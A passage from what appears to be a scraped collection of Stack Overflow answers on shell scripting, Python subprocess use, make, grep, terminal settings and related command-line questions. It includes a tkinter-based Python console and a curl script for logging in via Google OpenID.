os.stat(\"idle.txt\").st_size\n\n        if size != 0:\n            return True\n        else:\n            return False\n\n    def run_commands(self, command):\n        \"\"\"\n\n        This method would return output of every command place in text box\n        :param command: python command from text box\n        :return: output of command\n        \"\"\"\n\n        print(\"Running command: {}\".format(command))\n        value = None\n        new_line_char = command.find('\\n')\n        semi_colons_char = command.find(';')\n        double_quote = command.find('\"')\n\n        try:\n            if new_line_char != -1:\n\n                if semi_colons_char != -1 & double_quote == -1:\n\n                    new_cmd = command.replace(\"\\n\", \"\")\n                    cmd_value = '\"' + new_cmd + '\"'\n                    self.store_commands(command)\n\n                    value = check_output(\"python -c \" + cmd_value, shell=True).decode()\n                elif semi_colons_char == -1 & double_quote == -1:\n\n                    new_cmd = command.replace(\"\\n\", \";\")\n                    cmd_value = '\"' + new_cmd + '\"'\n                    self.store_commands(command)\n                    value = check_output(\"python -c \" + cmd_value, shell=True).decode()\n\n                elif double_quote != -1:\n\n                    cmd_1 = command.replace('\"', \"'\")\n                    new_cmd = cmd_1.replace('\\n', ';')\n\n                    cmd_value = '\"' + new_cmd + '\"'\n                    self.store_commands(command)\n\n                    value = check_output(\"python -c \" + cmd_value, shell=True).decode()\n\n                elif self.body.compare(\"end-1c\", \"==\", \"1.0\"):\n                    self.entry_content.set(\"the widget is empty\")\n\n            elif self.body.compare(\"end-1c\", \"==\", \"1.0\"):\n                value = \"The widget is empty. Please Enter Something.\"\n\n            else:\n                variable_analyzer = command.find('=')\n                file_size = PythonShell.check_if_file_empty()\n\n                if file_size:\n                    new_cmd = command.replace('\"', \"'\")\n                    cmd_value = '\"' + new_cmd + '\"'\n                    stored_value = self.get_stored_commands()\n                    cmd = stored_value + cmd_value\n                    cmd.replace('\"', '')\n\n                    value = check_output(\"python -c \" + cmd, shell=True).decode()\n                elif variable_analyzer != -1:\n                    new_cmd = command.replace('\"', \"'\")\n                    cmd_value = '\"' + new_cmd + '\"'\n                    self.store_commands(cmd_value)\n\n                    value = 'Waiting for input...'\n                    pass\n                else:\n                    new_cmd = command.replace('\"', \"'\")\n                    cmd_value = '\"' + new_cmd + '\"'\n                    value = check_output(\"python -c \" + cmd_value, shell=True).decode()\n\n        except Exception as ex:\n            print('>>>', ex)\n            self.entry_content.set('Invalid Command. Try again!!!')\n\n        print('>>', value)\n        # To Clear Text body After Button Click\n        # self.body.delete('1.0', END)\n\n        return value\n\n    def start_terminal(self):\n        \"\"\"\n        Initiate tkinter session to place and run commands\n        :return:\n        \"\"\"\n        self.master.propagate(0)\n        self.master.geometry('750x350')\n        self.master.title('Python IDLE')\n        self.master.configure(background='#272626')\n\n        terminal.welcome_note()\n\n        self.body = Text(self.master, height='10', width='75', font='Consolas 12', background=\"#272626\",\n                         foreground=\"white\",\n                         insertbackground='white')\n        # self.body.propagate(0)\n        self.body.pack(expand=True)\n\n        Label(text=\">> Command Output <<\", font='Arial 12', background=\"#272626\",\n              foreground=\"white\").pack()\n\n        self.entry_content = StringVar()\n        self.entry = Entry(self.master, textvariable=self.entry_content, width=50, font='Consolas 16',\n                           background=\"white\",\n                           foreground=\"black\")\n        self.entry.pack()\n        # self.entry.propagate(0)\n\n        self.button = Button(self.master, text=\"Run Command\", command=self.get_text, background=\"white\",\n                             foreground=\"black\",\n                             font='Helvetica 12').pack()\n\n        self.master.mainloop()\n\n\nif __name__ == '__main__':\n    terminal = PythonShell()\n    terminal.start_terminal()\nThe above given python script has following hierarchy as given;\n    |import ...      \n    |class PythonShell:\n        |def __init__(self):...\n\n        @staticmethod\n        |def welcome_note():...\n        |def get_text(self):...\n        |def store_commands(self, commmand):...\n        |def get_stored_commands(self):...\n\n        @staticmethod\n        |def check_if_file_empty():\n        |def run_commands(self, command):...\n        |def start_terminal(self):...\n\n    |if __name__ == '__main__':...\nWorkflow:\nThe basic workflow for the above code is given as follows;\ndef welcome_note():... Includes the Label that will display outside the text body.\ndef get_text(self):... Performs two operations; ** Get text from text body ** & ** Set Output in the Entry Box **.\ndef store_commands(self, command):... Use to store variable into file.\ndef get_stored_commands(self):... Get variable stored in file.\ndef check_if_file_empty():... Check Size of file.\ndef run_commands(self, command):... This method act as python compiler that take commands, do processing and yield output for the given command. To run commands, i would recommend to use subprocess-module because it provides more powerful facilities for spawning new processes and retrieving their results; To run window-commands using python includes various builtin libraries such as;\n1. os (in detail), 2. subprocess (in detail) etc.\nTo checkout which is better to use, visit reference: subprocess- module is preferable than os-module.\ndef start_terminal(self):... This method simply involves the functionality to initiate tkinter session window and show basic layout for input and output window.\nYou can further modify and optimize this code according to your requirement.\nWorkaroud:\nThis simple tkinter GUI based python shell perform simple functionality as windows-command-prompt. To run python commands directly in command-prompt without moving into python terminal, we do simple as;\npython -c \"print('Hey Eleeza!!!')\"\nIts result would be simple as;\nHey Eleeza!!!\nSimilarly, to run more than one lines directly at a time as given;\npython -c \"import platform;sys_info=platform.uname();print(sys_info)\"\nIts output would be as;\nMy System Info: uname_result(system='Windows', node='DESKTOP-J75UTG5', release='10', version='10.0.18362', machine='AMD64', processor='Intel64 Family 6 Model 142 Stepping 10, GenuineIntel')\nSo to use this tkinter python shell;\nEither you can place command as;\nimport platform\nvalue=platform.uname()\nprint('Value:', value)\nor like this way;\nimport platform;value=platform.uname();\nprint('Value:', value)\nor simply inline command as\nimport platform;value=platform.uname();print('Value:', value)\nYou will get the same result.",
    "Run shell command in pdb mode": "Simply use the \"os\" module and you will able to easily execute any os command from within pdb.\nStart with:\n(Pdb) import os\nAnd then:\n(Pdb) os.system(\"ls\")\nor even\n(Pdb) os.system(\"sh\")\nthe latest simply spawns a subshell. Exiting from it returns back to debugger.\nNote: the \"cd\" command will have no effect when used as os.system(\"cd dir\") since it will not change the cwd of the python process. Use os.chdir(\"/path/to/targetdir\") for that.",
    "Running a python function as a bash command": "You can create a base script, let's say command.py and check with what name this script was called (don't forget to make it executable):\n#!/usr/bin/python\nimport os.path\nimport sys\n\ndef command1(*args):\n    print 'Command1'\n    print args\n\ndef command2(*args):\n    print 'Command2'\n    print args\n\n\ncommands = {\n    'command1': command1,\n    'command2': command2\n}\n\nif __name__ == '__main__':\n    command = os.path.basename(sys.argv[0])\n    if command in commands:\n        commands[command](*sys.argv[1:])\nThen you can create soft links to this script:\nln -s command.py command1\nln -s command.py command2\nand finally test it:\n$ ./command1 hello\nCommand1\n('hello',)\n\n$ ./command2 world\nCommand2\n('world',)",
    "Is there an official manual for zparseopts? [closed]": "The man page entry for zparseopts can be found in zshmodules(1).",
    "Formatting lists with the column command in *nix": "In theory, to specify a newline, you can use the $'...' notation, which is just like '...' except that it supports C-style escape-sequences:\ncolumn -t -s $'\\n' list-of-entries.txt\nHowever, I don't really understand the purpose of this. A newline is the row delimiter, so a column-delimiter of $'\\n' is equivalent to not having any column-delimiter at all:\ncolumn -t -s '' list-of-entries.txt\nwhich means that the input will be treated as having only one column; so it's equivalent to not using column at all:\ncat list-of-entries.txt\nIt seems like you actually don't want to use the -t flag, because the purpose of the -t flag is to ensure that each line of input becomes one line of output, and it doesn't sound like that's what you want. I'm guessing you want this:\ncolumn list-of-entries.txt\nwhich will treat each line of list-of-entries.txt as a value to be put in one cell of the table that column outputs.",
    "How can I manipulate file names using bash and sed?": "If you need to rename multiple files, I would suggest to use rename command:\n# remove \"-n\" after you verify it is what you need\nrename -n 's/hello/hi/g' $(find /home/devel/stuff/static/ -type f)\nor, if you don't have rename try this:\nfind /home/devel/stuff/static/ -type f | while read FILE\ndo\n    # modify line below to do what you need, then remove leading \"echo\" \n    echo mv $FILE $(echo $FILE | sed 's/hello/hi/g')\ndone",
    "How can I identify the current terminal emulator from a bash script?": "I'm not sure how to tell iTerm and iTerm2 apart, but check the $TERM_PROGRAM envar. For me (Mac OS X 10.7), it returns Apple_Terminal for Terminal.app, and iTerm.app for iTerm2.",
    "Packer can't execute shell provisioner as sudo": "You should override the execute_command. Example:\n  \"provisioners\": [\n    {\n      \"execute_command\": \"echo 'vagrant' | {{.Vars}} sudo -S -E sh -eux '{{.Path}}'\",\n      \"scripts\": [\n        \"scripts/foo.sh\"\n      ],\n      \"type\": \"shell\"\n    }\n  ],",
    "How to suppress git clone output? [duplicate]": "Redirect output into the bitbucket.\ngit clone --quiet ssh://XXXXXXX:29418/git_performance_check > /dev/null",
    "Printing executed commands": "Starting from fish-3.1.0, $fish_trace can be set to enable output similar to Bash\u2019s set -x.\nFor example,\nset fish_trace 1\nbefore commands that should be traced.",
    "How can I pass and return a value from user defined function in MAKEFILE?": "User-defined macros must be a single \"expression\". The returned value is the result of expanding the expression. You definitely cannot use ifneq or variable assignments or other similar things in a user-defined macro.\nYou can create a makefile piece which is used alongside call, but it can only be used with eval, and that means it's a separate section of makefile, not really a \"function\" as normally defined.\nSo, if you can construct your user-defined macro with just make functions such that the result of the expansion is the result you want then you can do it as a macro; for example:\nmyfuntest = $(or $(filter %pattern,$(1)),$(error this is an error))\n\nresults := $(call myfuntest,foo barpattern biz baz)\nIf the result of the filter will either be a list of matching words and that will be assigned to results, or else it will run the error function.\nHowever, if your function is more complex and cannot be expressed in an expression format, you will have to use eval, and pass in the name of the variable to be assigned, like this:\ndefine myfuntest\n  ... compute fnames from $(2) ...\n$(1) := $$(fnames)\nendef\nYou must be very careful with $ vs. $$, as always when using eval and call together. You then invoke this like:\n$(eval $(call myfuntest,return_value,$(abc)))",
    "Looping through lines in a file in bash, without using stdin": "You must open as a different file descriptor\nwhile read p <&3; do\n    echo \"$p\"\n    echo 'Hit enter for the next one'\n    read x\ndone 3< list.txt\nUpdate: Just ignore the lengthy discussion in the comments below. It has nothing to do with the question or this answer.",
    "Python 3 won't run from the Git Bash command line [duplicate]": "\"One caveat if using Git Bash with MinTTY: python doesn't go into interactive mode so a solution is to force it to start that way: echo alias python=\\\"python -i\\\" >> ~/.bash_profile\"]\nFor more details\nI had the same issue and using \"python -i\" solved it.",
    "What's the difference between \"grep -e\" and \"grep -E\" [closed]": "As you mentioned, grep -E is for extended regular expressions whereas -e is for basic regular expressions. From the man page:\nEDIT: As Jonathan pointed out below, grep -e \"specifies that the following argument is (one of) the regular expression(s) to be matched.\"\nBasic vs Extended Regular Expressions\nIn basic regular expressions the meta-characters ?, +, {, |, (, and ) lose their special meaning; instead use the backslashed versions \\?, \\+, \\{, \\|, \\(, and \\).\nTraditional egrep did not support the { meta-character, and some egrep implementations support \\{ instead, so portable scripts should avoid { in grep -E patterns and should use [{] to match a literal {.\nGNU grep -E attempts to support traditional usage by assuming that { is not special if it would be the start of an invalid interval specification. For example, the command grep -E '{1' searches for the two-character string {1 instead of reporting a syntax error in the regular expression. POSIX.2 allows this behavior as an extension, but portable scripts should avoid it.\nBut man pages are pretty terse, so for further info, check out this link:\nhttp://www.regular-expressions.info/posix.html\nThe part of the manpage regarding the { meta character though specifically talks about what you are seeing with respect to the difference.\ngrep -e \"[0-9]{3}-[0-9]{3}-[0-9]{4}\" \nwon't work because it is not treating the { character as you expect. Whereas\ngrep -E \"[0-9]{3}-[0-9]{3}-[0-9]{4}\" \ndoes because that is the extended grep version \u2014 or the egrep version for example.",
    "echo -e working in terminal but not in bash script": "Wrong shebang:\n#! /bin/sh\nWhen it shall be a bash script, use\n#! /bin/bash\nBash has a buildin echo, which isn't 100% identic with /bin/echo.",
    "closing stdout of piped python subprocess": "From Wikipedia, SIGPIPE is the signal sent to a process when it attempts to write to a pipe without a process connected to the other end.\nWhen you first create p1 using stdout=PIPE, there is one process connected to the pipe, which is your Python process, and you can read the output using p1.stdout.\nWhen you create p2 using stdin=p1.stdout there are now two processes connected to the pipe p1.stdout.\nGenerally when you are running processes in a pipeline you want all processes to end when any of the processes end. For this to happen automatically you need to close p1.stdout so p2.stdin is the only process attached to that pipe, this way if p2 ends and p1 writes additional data to stdout, it will receive a SIGPIPE since there are no longer any processes attached to that pipe.",
    "GPG key exists in the list?": "Run gpg --list-keys [key-id] (or the abbreviated command -k), which will have a return code of 0 (success) if a matching key exists, or something else (failure) otherwise. Don't list all keys and grep afterwards as proposed by others in the comments, this will get horribly slow for larger numbers of keys in the keyring. Run\ngpg --list-keys [key-id] || gpg --keyserver [server] --recv-keys [key-id]\nto fetch missing keys, possibly discarding the first gpg call's output (gpg --list-keys [key-id]  >/dev/null 2>&1 || ...), as you're only interested in the return code.\nBe aware that\nupdating keys from time to time might be a reasonable thing to do to fetch revocations\nespecially short key IDs should never be used, use the whole fingerprint if possible.",
    "Setting environment variable to a large value -> \"Argument list too long\"": "Command-line arguments and environment variables both come out of the same pool of space. Set environment variables too long, and you no longer have space for command-line arguments -- and even xargs, which breaks command line invocations down into smaller groupings to fit inside the pool where possible, can't operate when that pool is completely full.\nSo: Don't do that. For instance, you might store your data in a file, and export the path to that file in the environment.\nBy the way -- the reason echo works is that it's built into your shell. Thus,\necho \"$LG\"\n...doesn't need to start an external process, so the limits on argument list length and environment size at process startup time don't apply.\nOn the other hand, if you ran\n/bin/echo \"$LG\"\n...then you'd see the problem again.\nGiven the explanation edited into the question as to what you're actually trying to accomplish, let me suggest an approach which requires neither environment space nor command-line space:\n#!/bin/bash\n#      ^-- also consider ksh; faster than bash, but also supports <()\n#          /bin/sh is not usable here, as POSIX sh does not specify <().\n\nlg=... ## DO NOT USE export HERE!\nsed -f <(printf '%s\\n' \"s/A/$lg/g\")",
    "Minicom send automate script": "Minicom have -S option for executing SCRIPT at startup time,so made a script with your commands like\nvi script.txt\nsend atz\nsend at\nRun your script with minicom like\nminicom -S script.txt\nAlso refer http://www.linuxcommand.org/man_pages/runscript1.html for minicom scripting",
    "Why ulimit can't limit resident memory successfully and how?": "According to the man page for setrlimit:\nRLIMIT_RSS\nSpecifies the limit (in pages) of the process's resident set (the number of virtual pages resident in RAM). This limit only has effect in Linux 2.4.x, x < 30, and there only affects calls to madvise(2) specifying MADV_WILLNEED\nYou probably want to set the virtual memory size instead, via ulimit -v",
    "Use exec-maven-plugin to execute shell script on Windows": "Your commandline is*:\n[dependencies.sh, project-in-question.dependencies, target, third-parameter]\nBut on Windows the dependencies.sh is not an executable. To run it with cygwin you would have to run it like this*:\n[c:\\cygwin\\bin\\run.exe, dependencies.sh, project-in-question.dependencies, target, third-parameter]\nNow I guess, that the others would not be happy with changing the pom.xml to that.\nOne possible solution should be to install \"Windows Subsystem For Linux\".\nAnother solution would be to create a dependencies.sh.bat containing something like:\nc:\\cygwin\\bin\\run.exe dependencies.sh %*\nbut with this solution you probably have to rename the dependencies.sh on your computer so that windows will pick the .bat file first.\nAnother compromise might be to change the execution to\n<executable>sh</executable>\n  <arguments>\n    <argument>-c</argument>\n    <argument>${project.basedir}/src/main/scripts/dependencies.sh ${project.build.directory}/${project.artifactId}.dependencies ${project.build.directory} project-in-question</argument>\nAnd on your system have a sh.bat in your PATH with:\nc:\\cygwin\\bin\\run.exe sh %*\n*I omitted the folders for better readability",
    "How do I change the shell for php's exec()": "",
    "How to use Android Studio with WSL (bash) as your shell Terminal?": "",
    "How to install shell commands in Atom to enable the atom command?": "According to the Atom Flight Manual, they should be installed when you run Atom for the first time.\nWhen you first open Atom, it will try to install the atom and apm commands for use in the terminal. In some cases, Atom might not be able to install these commands because it needs an administrator password. To check if Atom was able to install the atom command, for example, open a terminal window and type which atom. If the atom command has been installed, you'll see something like this:\n$ which atom\n/usr/local/bin/atom\n$\nIf the atom command wasn't installed, the which command won't return anything:\n$ which atom\n$\nTo install the atom and apm commands, run \"Window: Install Shell Commands\" from the Command Palette, which will prompt you for an administrator password.\nOn my system (a Mac), they are installed in /usr/local/bin, but the location might vary depending on which platform you are using.\nEDIT: I see your other question where you indicate you're using Windows. So this may not apply to you, as the quoted section deals with Mac computers. But I'll leave the answer here in case it helps someone else in the future.",
    "Bamboo - Pass Environmental Variables Between Tasks/Scripts": "This has been implemented using the Inject Variables plugin, which is bundled since 5.7: https://marketplace.atlassian.com/plugins/com.atlassian.bamboo.plugins.bamboo-variable-inject-plugin/server/overview\nThe way to do it is the following:\nin an initial task, have a script store the state to a file (in key=value format), something like:\necho \"MYVAR=$(cat some_variable_info_file)\" >> build/docker.properties\nconfigure a following Inject task to read the properties file from the previous step into Bamboo variables. Set the PATH to the properties file (e.g. build/docker.properties) and set a namespace, say docker\nto use this variable in the next script task*, one can refer to it as: $bamboo_docker_MYVAR where docker is the namespace and MYVAR is the key of the property in the property file. It can be referred to, for example, as:\necho $bamboo_docker_MYVAR\nThis means you can still used the file-based approach, just make sure the data in there is of type:\nsome_key1=some_value1\nsome_key2=some_value2\netc.\n*Note that from the Bamboo documentation, the underscores are the way to use it: https://confluence.atlassian.com/bamboo/bamboo-variables-289277087.html\nUsing variables in bash\nBamboo variables are exported as bash shell variables. All full stops (periods) are converted to underscores. For example, the variable bamboo.my.variable is $bamboo_my_variable in bash. This is related to File Script tasks (not Inline Script tasks).",
    "Difference between Mac `find` and Linux `find` [closed]": "The standard mandates the path (./ in your example) to be mandatory. find on MacOS follows the standard.\nGNU find (the one available on Linux) allows the path to be optional. If not specified, the current directory is assumed to be the path. On Linux, man find says\nfind [-H] [-L] [-P] [-D debugopts] [-Olevel] [path...] [expression]\n(note that path is specified within [...] denoting that it is optional.\nIt is a good practice to specify the path.",
    "How to write full-screen Linux console app/script?": "As said in some comments, you are looking for ncurses. The Linux Documentation Project have a very good HOWTO on ncurses for C that I used myself to start on it\nhttps://tldp.org/HOWTO/NCURSES-Programming-HOWTO/",
    "How to tell if python script is being run in a terminal or via GUI?": "$ echo ciao | python -c 'import sys; print sys.stdin.isatty()'\nFalse\nOf course, your GUI-based IDE might choose to \"fool\" you by opening a pseudo-terminal instead (you can do it yourself to other programs with pexpect, and, what's sauce for the goose...!-), in which case isatty or any other within-Python approach cannot tell the difference. But the same trick would also \"fool\" your example bash program (in exactly the same way) so I guess you're aware of that. OTOH, this will make it impossible for the program to accept input via a normal Unix \"pipe\"!\nA more reliable approach might therefore be to explicitly tell the program whether it must output to stdout or where else, e.g. with a command-line flag.",
    "How to set a shell exit trap from within a function in zsh and bash": "Obligatory boring and uninteresting answer:\nf() { \n  if [ \"$ZSH_VERSION\" ]\n  then\n    zshexit() { echo trap; sleep 1; }  # zsh specific\n  else\n    trap 'echo trap; sleep 1' EXIT     # POSIX\n  fi\n}",
    "Hbase put shell command": "Sorry, you cannot do that from the HBase shell. The 'put' command is used to \"Put a cell 'value' at specified table/row/column\". It's for 'putting' a single value.",
    "Start rails server automatically when ever I start my ubuntu machine": "You can use a cron job for this. To add the cron job use the command crontab -e. Than you can define a cron job that runs at boot and reboot with @reboot command.\nSo you'd have something like:\n@reboot cd /home/[path to project] && rails server",
    "Python in Emacs shell-mode turns on stty echo and breaks C-d": "0. Summary\nIf you installed Python via Macports, install the py27-gnureadline port (or py37-gnureadline, or whatever your version is) and the problem is fixed.\n1. Reproduction\nI can reproduce this (GNU Emacs 23.4.1; OS X 10.8.5; Python 3.3.2). Here's a session in a fresh emacs -Q showing the problem:\n$ stty -a > stty-before\n$ python3.3\nPython 3.3.2 (default, May 21 2013, 11:50:47) \n[GCC 4.2.1 Compatible Apple Clang 4.1 ((tags/Apple/clang-421.11.66))] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> quit()\nquit()\n$ stty -a > stty-after\nstty -a > stty-after\nbash-3.2$ diff stty-before stty-after\ndiff stty-before stty-after\n2c2\n< lflags: icanon isig iexten -echo echoe -echok echoke -echonl echoctl\n---\n> lflags: icanon isig iexten echo echoe -echok echoke -echonl echoctl\n7c7\n< oflags: opost -onlcr -oxtabs -onocr -onlret\n---\n> oflags: opost onlcr -oxtabs -onocr -onlret\n11,13c11,13\n<   eol2 = <undef>; erase = <undef>; intr = ^C; kill = <undef>;\n<   lnext = ^V; min = 1; quit = ^\\; reprint = ^R; start = ^Q;\n<   status = ^T; stop = ^S; susp = ^Z; time = 0; werase = ^W;\n---\n>   eol2 = <undef>; erase = ^?; intr = ^C; kill = ^U; lnext = ^V;\n>   min = 1; quit = ^\\; reprint = ^R; start = ^Q; status = ^T;\n>   stop = ^S; susp = ^Z; time = 0; werase = ^W;\nSo you can see that Python turned on the ECHO and ONLCR flags. Why did it do that? And why does it only do that on OS X?\n2. What's calling tcsetattr?\nI ran Python under GDB and set a breakpoint on tcsetattr to see what's calling it. Here are the relevant parts of the backtraces:\n#0  0x00007fff898e7e63 in tcsetattr ()\n#1  0x00000001007cbe96 in tty_init ()\n#2  0x00000001007c19cf in el_init ()\n#3  0x00000001007d1bb7 in rl_initialize ()\n#4  0x00000001003f10ea in PyInit_readline ()\n#0  0x00007fff898e7e63 in tcsetattr ()\n#1  0x00000001007cc812 in tty_rawmode ()\n#2  0x00000001007c610f in read_prepare ()\n#3  0x00000001007c203d in el_wset ()\n#4  0x00000001007d554d in el_set ()\n#5  0x00000001003f128a in call_readline ()\nPyInit_readline and call_readline are functions in readline.c, but you can see from the backtraces that this is not the real readline library that is being called here, but the mostly-compatible editline library. OS X ships with the BSD-licensed editline rather than the GPL-licensed readline, so this would explain why the behaviour is different on OS X from other Unixes.\n3. It's nothing to do with Python\nThe same thing happens with other interactive interpreters. I find that the Lua, Ruby and Sqlite3 command-line interpreters also turn on terminal echo when run inside Emacs. So it seems to be some kind of \"feature\" of the editline library. Let's test that theory by running this short program:\n#include <readline/readline.h>\n\nint main() {\n    char *line = readline(\"> \");\n    return 0;\n}\nand sure enough, when compiled with\n$ clang rl.c -lreadline\nthis program also turns on terminal echo when run inside Emacs. But when compiled with\n$ clang rl.c -L/opt/local/lib -lreadline\nwhich causes it to link with the real (GNU) readline library, installed by MacPorts, it works as expected (not turning on echo).\n4. Bug and workaround\nSo this looks like a bug in the editline library. Let's check that this really is the system version of the library, and not (say) the MacPorts version, using DYLD_PRINT_LIBRARIES:\n$ export DYLD_PRINT_LIBRARIES=1\n$ /usr/bin/python\ndyld: loaded: /usr/bin/python\ndyld: loaded: /System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation\n[... many lines omitted ...]\ndyld: loaded: /usr/lib/libstdc++.6.dylib\nPython 2.6.7 (r267:88850, Oct 11 2012, 20:15:00) \n[GCC 4.2.1 Compatible Apple Clang 4.0 (tags/Apple/clang-418.0.60)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\ndyld: loaded: /System/Library/Frameworks/Python.framework/Versions/2.6/lib/python2.6/lib-dynload/readline.so\ndyld: loaded: /usr/lib/libedit.3.dylib\ndyld: loaded: /usr/lib/libncurses.5.4.dylib\n>>> \nI have reported this to Apple as bug 15184759. I understand that Apple use the number of people reporting an issue as an indicator of the issue's severity, so please report the issue yourself if you want it to be fixed.\nNow, I believe this broke in a fairly recent upgrade to OS X, so it seems likely that a recent change to libedit introduced the error. Here are the versions of libedit installed by MacPorts:\n$ port installed libedit\nThe following ports are currently installed:\n  libedit @20110802-3.0_0\n  libedit @20120601-3.0_0\n  libedit @20121213-3.0_0 (active)\nIf I go back in time to the June 2012 version:\n$ sudo port activate libedit@20120601-3.0_0\n--->  Computing dependencies for libedit\n--->  Deactivating libedit @20121213-3.0_0\n--->  Cleaning libedit\n--->  Activating libedit @20120601-3.0_0\n--->  Cleaning libedit\nThen this fixes both problems (the terminal ECHO flag and the broken C-d) in the MacPorts versions of all the interactive interpreters I tested (Python, Ruby, Sqlite3).\nSo if you are looking for a workaround for your problems, this is it: use MacPorts to revert to a version of libedit before it broke, and put /opt/local/bin on your PATH so that when you type python you get the MacPorts installation of Python rather than the system one. (Possibly you do this already since I see that your Python is 2.7.5 whereas the system version is 2.6.7.)\n5. Reporting to upstream\nI downloaded the latest version of libedit from upstream to see if the problem has been fixed there. But it hasn't. So I contacted Jess Thrysoee and reported the bug.\n6. Update\nAs of December 2018, the problem has not yet been fixed in libedit. However, if you are using Macports then there is a workaround (see issue #48807): you can install the pyXX-gnureadline port (where XX is your Python version, for example py27-gnureadline or py35-gnureadline) which links Python against the GNU readline library instead of libedit. Now the terminal settings are unchanged:\n$ sudo port install py37-gnureadline\n[...]\n$ stty -a > stty-before\n$ python3.7\nPython 3.7.1 (default, Oct 21 2018, 09:01:26) \n[Clang 10.0.0 (clang-1000.11.45.2)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> quit()\n$ stty -a > stty-after\n$ diff stty-before stty-after \n$ ",
    "Shell script with wc -l, if statement ain't working": "try to use [ $words -eq 26 ] instead of [ $words == 26 ]\nor [ 26 == 26 ] to check that statement works properly",
    "escape curly braces in unix shell script": "The problem is that when you have a list in braces outside quotes, the shell performs Brace Expansion (bash manual, but ksh will be similar). Since the 'outside quotes' bit is important, it also tells you how to avoid the problem \u2014 enclose the string in quotes when printing:\n#!/usr/bin/ksh \nvalid_data_range=\"{2013/05/01},{2013/05/02},{2013/05/03}\"\nfinalDates=\"{$valid_data_range}\"\nprint \"$finalDates\"\n(The print command is specific to ksh and is not present in bash. The change in the assignment line is more cosmetic than functional.)\nAlso, the brace expansion would not occur in bash; it only occurs when the braces are written directly. This bilingual script (ksh and bash):\nvalid_data_range=\"{2013/05/01},{2013/05/02},{2013/05/03}\"\nfinalDates=\"{$valid_data_range}\"\nprintf \"%s\\n\" \"$finalDates\"\nprintf \"%s\\n\" $finalDates\nproduces:\nksh\n{{2013/05/01},{2013/05/02},{2013/05/03}}\n{2013/05/01}\n{2013/05/02}\n{2013/05/03}\nbash (also zsh)\n{{2013/05/01},{2013/05/02},{2013/05/03}}\n{{2013/05/01},{2013/05/02},{2013/05/03}}\nThus, when you need to use the variable $finalDates, ensure it is inside double quotes:\nother_command \"$finalDates\"\nif [ \"$finalDates\" = \"$otherString\" ]\nthen : whatever\nelse : something\nfi\nEtc \u2014 using your preferred layout for whatever you don't like about mine.",
    "How to update ENV variables in a Process without restarting it (NodeJS)?": "From a programmatic standpoint, you should be able to update the process.env variable that was passed into the running process.\nFor example, running:\ncmd_line$: MY_VALUE=some_val node ./index.js\nwith code:\nconsole.log(process.env.MY_VALUE)\nprocess.env.MY_VALUE = 'some other value'\nconsole.log(process.env.MY_VALUE)\nprocess.env.MY_VALUE = 4\nconsole.log(process.env.MY_VALUE)\noutput in terminal:\nsome_val\nsome other value\n4\nFrom a server admin standpoint for an already running application, I don't know the answer to that.",
    "*Almost* Perfect C Shell Piping": "Okay, I have found one little error. This\n       if( execvp(args[place], args) < 0 ){\nshould be\n       if( execvp(args[place], args+place) < 0 ){\nYour version used the args for the first command for all the others. Other than that, it works for me.",
    "Linux: write a C program that 'controls' a shell": "You can use pipes for that. Linux shells allow redirection.\nI used pipes to control tty's.",
    "Logging into Stack Overflow with cURL": "The Google login service is specific to the particular service you're using (Google docs vs Google Analytics vs Google Maps etc). The service ode you've specified (lh2) is specific to Google Picasa.\nUnfortunately there doesn't seem to be an equivalent code for OpenId (at least, not that I could find!)\nThe page that you get back from Google should contain a login form. If you look at that, it should be possible to construct a curl invocation to log in; that should then redirect you back to SO (or whichever openID page you want to log in to) logged in.\nIt turns out that doing this is a little tricky, because you have to parse out some of the the form fields to submit them back to Google, and because Google doesn't send back a straight HTTP redirect, but an HTML doc with a <meta http-equiv=\"redirect\" ...> tag. And of course you have to enable cookies. But this is all possible in a script using curl - the following works for me:\n#!/bin/bash\n\n# Utility function for parsing values out of an HTML form\nget_value()\n{\n    local tagtype=\"$1\" attrname=\"$2\" attrvalue=\"$3\" getattr=\"$4\"\n    perl -MHTML::TreeBuilder - \"$@\" <<EOF\n         @args=@ARGV;\n         \\$h=HTML::TreeBuilder->new;\n         \\$h->parse_file(\"$htmlfile\");\n         while (\\$#args > 0) {\n             \\$h=\\$h->look_down(_tag => shift @args,\n                                shift @args => shift @args);\n         }\n         print \\$h->attr(shift @args);\nEOF\n}\n\n# Empty the cookie jar\ncj=\"cookiejar\"\nrm -f \"$cj\"\n\n# Attempt to log in to SO. This will redirect to a google URL.\nendpoint=\"https://www.google.com/accounts/o8/id\"\n\ngoogle_url=`curl -L -s -S http://stackoverflow.com/users/authenticate \\\n    -d \"openid_identifier=$endpoint\" \\\n    -o /dev/null -b \"$cj\" -c \"$cj\" \\\n    -w %{url_effective}`\necho $google_url\necho\necho\n\n# Retrieve the form from Google\nhtmlfile=googleform.html\ncurl -L -s -S -o \"$htmlfile\" -b \"$cj\" -c \"$cj\" \"$google_url\"\n\n# Parse out the form fields\nform_url=`get_value form id gaia_loginform action`\n\nfdsh=`get_value form id gaia_loginform input name dsh value`\nfcontinue=`get_value form id gaia_loginform input name continue value`\nfservice=`get_value form id gaia_loginform input name service value`\nfGALX=`get_value form id gaia_loginform input name GALX value`\nfrmShown=`get_value form id gaia_loginform input name rmShown value`\nfsignIn=`get_value form id gaia_loginform input name signIn value`\n\nfEmail='INSERT LOGIN EMAIL HERE'\nfPasswd='INSERT PASSWORD HERE'\n\n# Submit the login form\nhtmlfile=google2.html\ncurl -L -s -S -o \"$htmlfile\" -b \"$cj\" -c \"$cj\" --data-urlencode dsh=\"$fdsh\" \\\n  --data-urlencode continue=\"$fcontinue\" \\\n  --data-urlencode service=\"$fservice\" \\\n  --data-urlencode GALX=\"$fGALX\" \\\n  --data-urlencode Email=\"$fEmail\" \\\n  --data-urlencode Passwd=\"$fPasswd\" \\\n  --data-urlencode rmShown=\"$frmShown\" \\\n  --data-urlencode signIn=\"$fsignIn\" \\\n  \"$form_url\"\n\n# Interpret the redirect\nredirect=`get_value meta http-equiv refresh content | sed \"s/^.*'\\(.*\\)'.*$/\\1/\"`\n\n# Follow it\nhtmlfile=google3.html\ncurl -L -s -S -o \"$htmlfile\" -b \"$cj\" -c \"$cj\" \"$redirect\"\n(Note that I seem to have a slightly different version of curl from you, so I had to change the -w options slightly; I'm guessing my version will work for you but you may need to tweak it.)",
